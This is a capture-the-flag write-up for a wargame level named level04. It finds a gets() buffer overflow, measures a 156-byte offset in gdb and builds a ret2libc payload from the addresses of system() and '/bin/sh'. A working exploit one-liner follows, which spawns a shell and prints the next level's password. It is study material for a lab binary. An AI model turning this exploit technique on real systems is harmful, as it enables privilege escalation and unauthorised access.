# level04

Nothing of note with `ll`.
`checksec` is tamer this time around :
`Partial RELRO`, so we cannot overwrite the **GOT**.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|fflush|frame_dummy|
|gets|clear_stdin|
|getchar|get_unum|
|signal|prog_timeout|
|alarm|enable_timeout_cons|
|wait|main|
|puts||
|kill||
|prctl||
|fork||
|scanf||
|ptrace||

Me sees an unprotected call to `gets()`, me attempts a **buffer overflow**.

```sh
gdb ./level04
(gdb) set follow-fork-mode child
(gdb) r
[...]
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
[...]
0x41326641 in ?? ()
# This is an offset of 156 bytes
```

I used the [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) once again.

We'll try what is called a **[ret2libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack)**, you can find a more thorough explanation on this [medium article](https://medium.com/@mounisha.makineni12/return-to-libc-attack-exploiting-buffer-overflow-for-privilege-escalation-105fea0fe9a2).

Let's find the address of the `system()` function as well as `/bin/sh`.

```sh
gdb ./level04
(gdb) set follow-fork-mode child			# We have to use fork mode since the call to `gets()` happens in the child
(gdb) b puts
Breakpoint 1 at 0x8048500
(gdb) r
[...]
Breakpoint 1, 0xf7e927c0 in puts () from /lib32/libc.so.6
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# Finding the address of "/bin/sh"
(gdb) info proc mappings					# This shows the address ranges in the program
[...]
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so	# This is the libc's .text data range, let's search there
[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

We have everything to build our payload (with our addresses in injectable little endian).

|padding|address of `system()`|address of `/bin/sh`|
|-|-|-|-|
|'a' * 156|\xd0\xae\xe6\xf7|\xec\x97\xf8\xf7|


```sh
(cat <(python -c "print('a' * 156 + '\xd0\xae\xe6\xf7' + 'alec' + '\xec\x97\xf8\xf7');") -) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

And it has been found!

```sh
su level05
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

As Bon Jovi said : "We're halfway there..."
